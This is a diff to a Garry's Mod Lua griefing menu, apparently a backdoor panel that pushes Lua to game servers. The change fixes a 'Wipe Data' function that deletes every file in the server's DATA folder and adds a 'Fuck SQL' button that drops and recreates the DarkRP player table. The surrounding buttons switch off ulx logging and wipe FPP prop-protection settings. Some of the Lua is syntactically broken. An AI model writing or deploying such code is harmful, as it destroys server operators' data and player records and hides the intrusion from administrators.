@@ -588,7 +588,7 @@ function ulxLogEcho()
 	sendLua([[RunConsoleCommand("ulx", "logecho", "0")]]) 
 end 
 
-function wipeDate() 
+function wipeData() 
 	sendLua([[local files, directories = files.Find("*", "DATA"), for k,v in pairs(files) do file.Delete(v) end]]) 
 end 
 
@@ -612,6 +612,8 @@ function fuckFPP()
 	sendLua([[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {}]]) 
 end 
 
+function fuckSQL() sendLua([[MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')]]) end
+	
 function Ply(name) 
 	name = string.lower(name); 
 	for _,v in ipairs(player.GetHumans()) do 
@@ -831,12 +833,13 @@ ambush.Button("Start Chat Spam", tab2VisList, startChatSpam, "Spams the chatbox 
 ambush.Button("Stop Chat Spam", tab2VisList, stopChatSpam, "Stops the chat spam.") 
 ambush.Button("Log Echo 1", tab2VisList, ulxLogEcho1, "Log eco to 1 so everything is logged within ulx.") 
 ambush.Button("Log Echo 0", tab2VisList, ulxLogEcho, "Log eco to 0 so nothing is logged within ulx.") 
-ambush.Button("Wipe Data", tab2VisList, test, "Run console command.") 
+ambush.Button("Wipe Data", tab2VisList, wipeData, "Run console command.") 
 ambush.Button("Console Command", tab2VisList, consoleRunString, "Run console command.") 
 ambush.Button("Fuck Gravity", tab2VisList, fuckGravity, "Run console command.") 
 ambush.Button("Fuck Friction", tab2VisList, fuckFriction, "Run console command.") 
 ambush.Button("Fuck Console", tab2VisList, fuckConsole, "Run console command.") 
-ambush.Button("Fuck FPP", tab2VisList, fuckFPP, "Run console command.") 
+ambush.Button("Fuck FPP", tab2VisList, fuckFPP, "Wipe FPP.") 
+ambush.Button("Fuck SQL", tab2VisList, fuckSQL, "Fuck the SQL Databases.") 
 ambush.Button("Strip Weapons", tab2VisList, removeAll, "Run console command.") 
 
 /* Player */ 
